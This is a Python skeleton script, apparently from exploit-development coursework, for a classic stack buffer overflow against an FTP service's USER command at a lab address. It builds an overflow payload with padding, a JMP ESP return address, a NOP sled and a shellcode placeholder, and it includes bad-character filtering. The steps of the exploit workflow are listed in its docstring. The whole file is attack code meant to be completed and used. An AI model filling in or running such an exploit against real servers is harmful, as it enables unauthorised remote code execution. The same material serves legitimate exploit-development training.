#!/usr/bin/env python3
"""EXP-301 stack BOF skeleton — vanilla EIP overwrite.
Fill the CONFIG block, then work the loop:
  1. fuzz (use exp301.py cyclic)  2. find offset  3. control EIP
  4. badchars (exp301.py badchars)  5. jmp esp / ROP  6. shellcode
"""
import socket, struct

# ---------- CONFIG ----------
HOST, PORT = "10.10.10.5", 21
PREFIX = b"USER "            # command that reaches the bug
SUFFIX = b"\r\n"
OFFSET = 0                    # <- exp301.py offset <eip>
BADCHARS = {0x00, 0x0a, 0x0d} # grow as you find them
# -----------------------------

def p32(v): return struct.pack('<I', v)

def clean(buf):
    bad = [f"0x{b:02x}@{i}" for i, b in enumerate(buf) if b in BADCHARS]
    if bad: raise SystemExit(f"[-] badchars in buffer: {bad[:8]}")
    return buf

JMP_ESP = 0x00000000          # <- from mona: !mona jmp -r esp -cpb '\x00'

buf  = b"A" * OFFSET
buf += p32(JMP_ESP)
buf += b"\x90" * 16
buf += clean(b"\xcc" * 300)   # <- replace with encoded shellcode

s = socket.socket()
s.connect((HOST, PORT))
s.recv(1024)
s.sendall(PREFIX + buf + SUFFIX)
print(f"[+] sent {len(buf)} bytes")
s.close()
